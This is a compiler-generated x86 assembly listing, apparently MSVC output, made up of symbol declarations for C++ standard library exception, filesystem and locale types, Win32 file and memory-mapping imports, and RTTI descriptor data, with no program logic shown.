PUBLIC	??$_Destroy_in_place@U_Dir_enum_impl@filesystem@std@@@std@@YAXAAU_Dir_enum_impl@filesystem@0@@Z ; std::_Destroy_in_place<std::filesystem::_Dir_enum_impl>
PUBLIC	??$_Allocate@$07U_Default_allocate_traits@std@@$0A@@std@@YAPAXI@Z ; std::_Allocate<8,std::_Default_allocate_traits,0>
PUBLIC	??$forward@AAPAV_Facet_base@std@@@std@@YAAAPAV_Facet_base@0@AAPAV10@@Z ; std::forward<std::_Facet_base * &>
PUBLIC	??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@_W@1@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>
PUBLIC	??$_Construct_in_place@U_Dir_enum_impl@filesystem@std@@U_Creator@123@ABW4directory_options@23@@std@@YAXAAU_Dir_enum_impl@filesystem@0@$$QAU_Creator@120@ABW4directory_options@20@@Z ; std::_Construct_in_place<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>
PUBLIC	??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPAXI@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
PUBLIC	??$_Get_size_of_n@$01@std@@YAII@Z		; std::_Get_size_of_n<2>
PUBLIC	??$_Get_size_of_n@$00@std@@YAII@Z		; std::_Get_size_of_n<1>
PUBLIC	??_7exception@std@@6B@				; std::exception::`vftable'
PUBLIC	??_C@_0BC@EOODALEL@Unknown?5exception@		; `string'
PUBLIC	??_7bad_alloc@std@@6B@				; std::bad_alloc::`vftable'
PUBLIC	??_7bad_array_new_length@std@@6B@		; std::bad_array_new_length::`vftable'
PUBLIC	??_C@_0BF@KINCDENJ@bad?5array?5new?5length@	; `string'
PUBLIC	??_R0?AVexception@std@@@8			; std::exception `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
PUBLIC	__TI3?AVbad_array_new_length@std@@
PUBLIC	__CTA3?AVbad_array_new_length@std@@
PUBLIC	??_R0?AVbad_array_new_length@std@@@8		; std::bad_array_new_length `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QAE@ABV01@@Z12
PUBLIC	??_R0?AVbad_alloc@std@@@8			; std::bad_alloc `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QAE@ABV01@@Z12
PUBLIC	?_Fake_alloc@std@@3U_Fake_allocator@1@B		; std::_Fake_alloc
PUBLIC	??_C@_0BA@JFNIOLAK@string?5too?5long@		; `string'
PUBLIC	??_7runtime_error@std@@6B@			; std::runtime_error::`vftable'
PUBLIC	??_R0?AVruntime_error@std@@@8			; std::runtime_error `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QAE@ABV01@@Z12
PUBLIC	??_7_System_error@std@@6B@			; std::_System_error::`vftable'
PUBLIC	??_C@_02LMMGGCAJ@?3?5@				; `string'
PUBLIC	??_7system_error@std@@6B@			; std::system_error::`vftable'
PUBLIC	__TI4?AVsystem_error@std@@
PUBLIC	__CTA4?AVsystem_error@std@@
PUBLIC	??_R0?AVsystem_error@std@@@8			; std::system_error `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QAE@ABV01@@Z20
PUBLIC	??_R0?AV_System_error@std@@@8			; std::_System_error `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QAE@ABV01@@Z20
PUBLIC	??_7_Generic_error_category@std@@6B@		; std::_Generic_error_category::`vftable'
PUBLIC	??_C@_07DCLBNMLN@generic@			; `string'
PUBLIC	??_7_Iostream_error_category2@std@@6B@		; std::_Iostream_error_category2::`vftable'
PUBLIC	??_C@_08LLGCOLLL@iostream@			; `string'
PUBLIC	?_Iostream_error@?4??message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB ; `std::_Iostream_error_category2::message'::`5'::_Iostream_error
PUBLIC	??_7_System_error_category@std@@6B@		; std::_System_error_category::`vftable'
PUBLIC	??_C@_06FHFOAHML@system@			; `string'
PUBLIC	?_Unknown_error@?4??message@_System_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB ; `std::_System_error_category::message'::`5'::_Unknown_error
PUBLIC	??_7bad_cast@std@@6B@				; std::bad_cast::`vftable'
PUBLIC	??_C@_08EPJLHIJG@bad?5cast@			; `string'
PUBLIC	__TI2?AVbad_cast@std@@
PUBLIC	__CTA2?AVbad_cast@std@@
PUBLIC	??_R0?AVbad_cast@std@@@8			; std::bad_cast `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QAE@ABV01@@Z12
PUBLIC	??_7_Facet_base@std@@6B@			; std::_Facet_base::`vftable'
PUBLIC	??_C@_0BA@ELKIONDK@bad?5locale?5name@		; `string'
PUBLIC	??_7facet@locale@std@@6B@			; std::locale::facet::`vftable'
PUBLIC	??_C@_00CNPNBAHC@@				; `string'
PUBLIC	??_7ctype_base@std@@6B@				; std::ctype_base::`vftable'
PUBLIC	??_7?$ctype@D@std@@6B@				; std::ctype<char>::`vftable'
PUBLIC	??_7failure@ios_base@std@@6B@			; std::ios_base::failure::`vftable'
PUBLIC	??_C@_0BF@PHHKMMFD@ios_base?3?3badbit?5set@	; `string'
PUBLIC	??_C@_0BG@FMKFHCIL@ios_base?3?3failbit?5set@	; `string'
PUBLIC	??_C@_0BF@OOHOMBOF@ios_base?3?3eofbit?5set@	; `string'
PUBLIC	__TI5?AVfailure@ios_base@std@@
PUBLIC	__CTA5?AVfailure@ios_base@std@@
PUBLIC	??_R0?AVfailure@ios_base@std@@@8		; std::ios_base::failure `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QAE@ABV012@@Z20
PUBLIC	?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
PUBLIC	??_7filesystem_error@filesystem@std@@6B@	; std::filesystem::filesystem_error::`vftable'
PUBLIC	??_C@_03NONCDIOG@?3?5?$CC@			; `string'
PUBLIC	??_C@_04PHMHGEMA@?$CC?0?5?$CC@			; `string'
PUBLIC	__TI5?AVfilesystem_error@filesystem@std@@
PUBLIC	__CTA5?AVfilesystem_error@filesystem@std@@
PUBLIC	??_R0?AVfilesystem_error@filesystem@std@@@8	; std::filesystem::filesystem_error `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVfilesystem_error@filesystem@std@@@8??0filesystem_error@filesystem@std@@QAE@ABV012@@Z92
PUBLIC	??_C@_0BI@LBKDNGFK@directory_entry?3?3status@	; `string'
PUBLIC	??_C@_13BBDEGPLJ@?$AA?$CK@			; `string'
PUBLIC	??_C@_0CH@GANCNKKD@directory_iterator?3?3directory_i@ ; `string'
PUBLIC	??_C@_0BP@DPMCMHCK@directory_iterator?3?3operator?$CL?$CL@ ; `string'
PUBLIC	??_C@_0BI@CFPLBAOH@invalid?5string?5position@	; `string'
PUBLIC	?_Static@?1???$_Immortalize_memcpy_image@V_Generic_error_category@std@@@std@@YAABV_Generic_error_category@1@XZ@4U?$_Constexpr_immortalize_impl@V_Generic_error_category@std@@@1@A ; `std::_Immortalize_memcpy_image<std::_Generic_error_category>'::`2'::_Static
PUBLIC	?_Static@?1???$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@1@XZ@4U?$_Constexpr_immortalize_impl@V_Iostream_error_category2@std@@@1@A ; `std::_Immortalize_memcpy_image<std::_Iostream_error_category2>'::`2'::_Static
PUBLIC	?_Static@?1???$_Immortalize_memcpy_image@V_System_error_category@std@@@std@@YAABV_System_error_category@1@XZ@4U?$_Constexpr_immortalize_impl@V_System_error_category@std@@@1@A ; `std::_Immortalize_memcpy_image<std::_System_error_category>'::`2'::_Static
PUBLIC	?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PBVfacet@locale@2@B ; std::_Facetptr<std::ctype<char> >::_Psave
PUBLIC	??_7?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@6B@ ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`vftable'
PUBLIC	??_R4exception@std@@6B@				; std::exception::`RTTI Complete Object Locator'
PUBLIC	??_R3exception@std@@8				; std::exception::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2exception@std@@8				; std::exception::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@exception@std@@8			; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_alloc@std@@6B@				; std::bad_alloc::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_alloc@std@@8				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_alloc@std@@8				; std::bad_alloc::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_alloc@std@@8			; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_array_new_length@std@@6B@		; std::bad_array_new_length::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_array_new_length@std@@8	; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4runtime_error@std@@6B@			; std::runtime_error::`RTTI Complete Object Locator'
PUBLIC	??_R3runtime_error@std@@8			; std::runtime_error::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2runtime_error@std@@8			; std::runtime_error::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@runtime_error@std@@8		; std::runtime_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R0?AVerror_category@std@@@8			; std::error_category `RTTI Type Descriptor'
PUBLIC	??_R3error_category@std@@8			; std::error_category::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2error_category@std@@8			; std::error_category::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@error_category@std@@8		; std::error_category::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4_System_error@std@@6B@			; std::_System_error::`RTTI Complete Object Locator'
PUBLIC	??_R3_System_error@std@@8			; std::_System_error::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_System_error@std@@8			; std::_System_error::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_System_error@std@@8		; std::_System_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4system_error@std@@6B@			; std::system_error::`RTTI Complete Object Locator'
PUBLIC	??_R3system_error@std@@8			; std::system_error::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2system_error@std@@8			; std::system_error::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@system_error@std@@8		; std::system_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4_Generic_error_category@std@@6B@		; std::_Generic_error_category::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV_Generic_error_category@std@@@8		; std::_Generic_error_category `RTTI Type Descriptor'
PUBLIC	??_R3_Generic_error_category@std@@8		; std::_Generic_error_category::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_Generic_error_category@std@@8		; std::_Generic_error_category::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_Generic_error_category@std@@8	; std::_Generic_error_category::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4_Iostream_error_category2@std@@6B@		; std::_Iostream_error_category2::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV_Iostream_error_category2@std@@@8	; std::_Iostream_error_category2 `RTTI Type Descriptor'
PUBLIC	??_R3_Iostream_error_category2@std@@8		; std::_Iostream_error_category2::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_Iostream_error_category2@std@@8		; std::_Iostream_error_category2::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_Iostream_error_category2@std@@8	; std::_Iostream_error_category2::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4_System_error_category@std@@6B@		; std::_System_error_category::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV_System_error_category@std@@@8		; std::_System_error_category `RTTI Type Descriptor'
PUBLIC	??_R3_System_error_category@std@@8		; std::_System_error_category::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_System_error_category@std@@8		; std::_System_error_category::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_System_error_category@std@@8	; std::_System_error_category::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_cast@std@@6B@				; std::bad_cast::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_cast@std@@8				; std::bad_cast::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_cast@std@@8				; std::bad_cast::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_cast@std@@8			; std::bad_cast::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R0?AV_Ref_count_base@std@@@8			; std::_Ref_count_base `RTTI Type Descriptor'
PUBLIC	??_R3_Ref_count_base@std@@8			; std::_Ref_count_base::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_Ref_count_base@std@@8			; std::_Ref_count_base::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_Ref_count_base@std@@8		; std::_Ref_count_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4_Facet_base@std@@6B@			; std::_Facet_base::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV_Facet_base@std@@@8			; std::_Facet_base `RTTI Type Descriptor'
PUBLIC	??_R3_Facet_base@std@@8				; std::_Facet_base::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_Facet_base@std@@8				; std::_Facet_base::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_Facet_base@std@@8		; std::_Facet_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4facet@locale@std@@6B@			; std::locale::facet::`RTTI Complete Object Locator'
PUBLIC	??_R0?AVfacet@locale@std@@@8			; std::locale::facet `RTTI Type Descriptor'
PUBLIC	??_R3facet@locale@std@@8			; std::locale::facet::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2facet@locale@std@@8			; std::locale::facet::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@facet@locale@std@@8		; std::locale::facet::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R13?0A@EA@_Crt_new_delete@std@@8		; std::_Crt_new_delete::`RTTI Base Class Descriptor at (4,-1,0,64)'
PUBLIC	??_R0?AU_Crt_new_delete@std@@@8			; std::_Crt_new_delete `RTTI Type Descriptor'
PUBLIC	??_R3_Crt_new_delete@std@@8			; std::_Crt_new_delete::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_Crt_new_delete@std@@8			; std::_Crt_new_delete::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_Crt_new_delete@std@@8		; std::_Crt_new_delete::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4ctype_base@std@@6B@			; std::ctype_base::`RTTI Complete Object Locator'
PUBLIC	??_R0?AUctype_base@std@@@8			; std::ctype_base `RTTI Type Descriptor'
PUBLIC	??_R3ctype_base@std@@8				; std::ctype_base::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2ctype_base@std@@8				; std::ctype_base::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@ctype_base@std@@8			; std::ctype_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$ctype@D@std@@6B@				; std::ctype<char>::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$ctype@D@std@@@8			; std::ctype<char> `RTTI Type Descriptor'
PUBLIC	??_R3?$ctype@D@std@@8				; std::ctype<char>::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$ctype@D@std@@8				; std::ctype<char>::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$ctype@D@std@@8			; std::ctype<char>::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4failure@ios_base@std@@6B@			; std::ios_base::failure::`RTTI Complete Object Locator'
PUBLIC	??_R3failure@ios_base@std@@8			; std::ios_base::failure::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2failure@ios_base@std@@8			; std::ios_base::failure::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@failure@ios_base@std@@8		; std::ios_base::failure::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4filesystem_error@filesystem@std@@6B@	; std::filesystem::filesystem_error::`RTTI Complete Object Locator'
PUBLIC	??_R3filesystem_error@filesystem@std@@8		; std::filesystem::filesystem_error::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2filesystem_error@filesystem@std@@8		; std::filesystem::filesystem_error::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@filesystem_error@filesystem@std@@8 ; std::filesystem::filesystem_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@6B@ ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@@8 ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl> `RTTI Type Descriptor'
PUBLIC	??_R3?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8 ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8 ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8 ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`RTTI Base Class Descriptor at (0,-1,0,64)'
EXTRN	__purecall:PROC
EXTRN	??2@YAPAXI@Z:PROC				; operator new
EXTRN	??3@YAXPAXI@Z:PROC				; operator delete
EXTRN	??_U@YAPAXI@Z:PROC				; operator new[]
EXTRN	??_V@YAXPAX@Z:PROC				; operator delete[]
EXTRN	__invalid_parameter_noinfo_noreturn:PROC
EXTRN	_memcpy:PROC
EXTRN	_memmove:PROC
EXTRN	_memset:PROC
EXTRN	_wcslen:PROC
EXTRN	_strcmp:PROC
EXTRN	__imp__CreateFileA@28:PROC
EXTRN	__imp__GetFileSize@8:PROC
EXTRN	__imp__ReadFile@20:PROC
EXTRN	__imp__SetEndOfFile@4:PROC
EXTRN	__imp__SetFilePointer@16:PROC
EXTRN	__imp__WriteFile@20:PROC
EXTRN	__imp__CloseHandle@4:PROC
EXTRN	__imp__VirtualProtect@16:PROC
EXTRN	__imp__MapViewOfFile@20:PROC
EXTRN	__imp__UnmapViewOfFile@4:PROC
EXTRN	__imp__CreateFileMappingA@24:PROC
EXTRN	_free:PROC
EXTRN	_malloc:PROC
EXTRN	??0_Lockit@std@@QAE@H@Z:PROC			; std::_Lockit::_Lockit
EXTRN	??1_Lockit@std@@QAE@XZ:PROC			; std::_Lockit::~_Lockit
EXTRN	?uncaught_exception@std@@YA_NXZ:PROC		; std::uncaught_exception
EXTRN	___std_exception_copy:PROC
EXTRN	___std_exception_destroy:PROC
EXTRN	??_Eexception@std@@UAEPAXI@Z:PROC		; std::exception::`vector deleting destructor'
EXTRN	??_Ebad_alloc@std@@UAEPAXI@Z:PROC		; std::bad_alloc::`vector deleting destructor'
EXTRN	??_Ebad_array_new_length@std@@UAEPAXI@Z:PROC	; std::bad_array_new_length::`vector deleting destructor'
EXTRN	___std_find_trivial_2@12:PROC
EXTRN	?_Xlength_error@std@@YAXPBD@Z:PROC		; std::_Xlength_error
EXTRN	?_Xout_of_range@std@@YAXPBD@Z:PROC		; std::_Xout_of_range
EXTRN	?_Xruntime_error@std@@YAXPBD@Z:PROC		; std::_Xruntime_error
EXTRN	___std_system_error_allocate_message@8:PROC
EXTRN	___std_system_error_deallocate_message@4:PROC
EXTRN	??_Eruntime_error@std@@UAEPAXI@Z:PROC		; std::runtime_error::`vector deleting destructor'
EXTRN	??_E_System_error@std@@UAEPAXI@Z:PROC		; std::_System_error::`vector deleting destructor'
EXTRN	??_Esystem_error@std@@UAEPAXI@Z:PROC		; std::system_error::`vector deleting destructor'
EXTRN	?_Syserror_map@std@@YAPBDH@Z:PROC		; std::_Syserror_map
EXTRN	?_Winerror_map@std@@YAHH@Z:PROC			; std::_Winerror_map
EXTRN	??_E_Generic_error_category@std@@UAEPAXI@Z:PROC	; std::_Generic_error_category::`vector deleting destructor'
EXTRN	??_E_Iostream_error_category2@std@@UAEPAXI@Z:PROC ; std::_Iostream_error_category2::`vector deleting destructor'
EXTRN	??_E_System_error_category@std@@UAEPAXI@Z:PROC	; std::_System_error_category::`vector deleting destructor'
EXTRN	___std_fs_directory_iterator_open@12:PROC
EXTRN	___std_fs_directory_iterator_close@4:PROC
EXTRN	___std_fs_get_stats@16:PROC
EXTRN	___std_fs_directory_iterator_advance@8:PROC
EXTRN	___std_fs_code_page@0:PROC
EXTRN	___std_fs_convert_narrow_to_wide@20:PROC
EXTRN	___std_fs_convert_wide_to_narrow@20:PROC
EXTRN	___std_fs_convert_wide_to_narrow_replace_chars@20:PROC
EXTRN	??_Ebad_cast@std@@UAEPAXI@Z:PROC		; std::bad_cast::`vector deleting destructor'
EXTRN	??_E_Facet_base@std@@UAEPAXI@Z:PROC		; std::_Facet_base::`vector deleting destructor'
EXTRN	?_Facet_Register@std@@YAXPAV_Facet_base@1@@Z:PROC ; std::_Facet_Register
EXTRN	__Getctype:PROC
EXTRN	__Tolower:PROC
EXTRN	__Toupper:PROC
EXTRN	?_Locinfo_ctor@_Locinfo@std@@SAXPAV12@PBD@Z:PROC ; std::_Locinfo::_Locinfo_ctor
EXTRN	?_Locinfo_dtor@_Locinfo@std@@SAXPAV12@@Z:PROC	; std::_Locinfo::_Locinfo_dtor
EXTRN	??_Efacet@locale@std@@MAEPAXI@Z:PROC		; std::locale::facet::`vector deleting destructor'
EXTRN	?_Getgloballocale@locale@std@@CAPAV_Locimp@12@XZ:PROC ; std::locale::_Getgloballocale
EXTRN	??_Ectype_base@std@@UAEPAXI@Z:PROC		; std::ctype_base::`vector deleting destructor'
EXTRN	??_E?$ctype@D@std@@MAEPAXI@Z:PROC		; std::ctype<char>::`vector deleting destructor'
EXTRN	??_Efailure@ios_base@std@@UAEPAXI@Z:PROC	; std::ios_base::failure::`vector deleting destructor'
EXTRN	??_Efilesystem_error@filesystem@std@@UAEPAXI@Z:PROC ; std::filesystem::filesystem_error::`vector deleting destructor'
EXTRN	??_E?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@UAEPAXI@Z:PROC ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`vector deleting destructor'
EXTRN	@__security_check_cookie@4:PROC
EXTRN	__CxxThrowException@8:PROC
EXTRN	___CxxFrameHandler3:PROC
EXTRN	__allshl:PROC
EXTRN	??_7type_info@@6B@:QWORD			; type_info::`vftable'
EXTRN	?_Id_cnt@id@locale@std@@0HA:DWORD		; std::locale::id::_Id_cnt
EXTRN	?id@?$ctype@D@std@@2V0locale@2@A:DWORD		; std::ctype<char>::id
EXTRN	?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A:BYTE ; std::cout
EXTRN	?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A:BYTE ; std::cerr
EXTRN	___security_cookie:DWORD
;	COMDAT ?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PBVfacet@locale@2@B
_BSS	SEGMENT
?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PBVfacet@locale@2@B DD 01H DUP (?) ; std::_Facetptr<std::ctype<char> >::_Psave
_BSS	ENDS
;	COMDAT ??_R1A@?0A@EA@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8 DD FLAT:??_R0?AV?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@@8 ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8
rdata$r	SEGMENT
??_R2?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8 DD FLAT:??_R1A@?0A@EA@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8 ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@_Ref_count_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R3?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8
rdata$r	SEGMENT
??_R3?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8 DD 00H ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@@8
data$rs	SEGMENT
??_R0?AV?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl> `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@s'
	DB	'td@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@6B@
rdata$r	SEGMENT
??_R4?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@6B@ DD 00H ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@@8
	DD	FLAT:??_R3?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@filesystem_error@filesystem@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@filesystem_error@filesystem@std@@8 DD FLAT:??_R0?AVfilesystem_error@filesystem@std@@@8 ; std::filesystem::filesystem_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	04H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3filesystem_error@filesystem@std@@8
rdata$r	ENDS
;	COMDAT ??_R2filesystem_error@filesystem@std@@8
rdata$r	SEGMENT
??_R2filesystem_error@filesystem@std@@8 DD FLAT:??_R1A@?0A@EA@filesystem_error@filesystem@std@@8 ; std::filesystem::filesystem_error::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@system_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@_System_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@runtime_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3filesystem_error@filesystem@std@@8
rdata$r	SEGMENT
??_R3filesystem_error@filesystem@std@@8 DD 00H		; std::filesystem::filesystem_error::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	05H
	DD	FLAT:??_R2filesystem_error@filesystem@std@@8
rdata$r	ENDS
;	COMDAT ??_R4filesystem_error@filesystem@std@@6B@
rdata$r	SEGMENT
??_R4filesystem_error@filesystem@std@@6B@ DD 00H	; std::filesystem::filesystem_error::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVfilesystem_error@filesystem@std@@@8
	DD	FLAT:??_R3filesystem_error@filesystem@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@failure@ios_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@failure@ios_base@std@@8 DD FLAT:??_R0?AVfailure@ios_base@std@@@8 ; std::ios_base::failure::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	04H
	DD	00H
	DD	0ffffffffH
	DD	00H
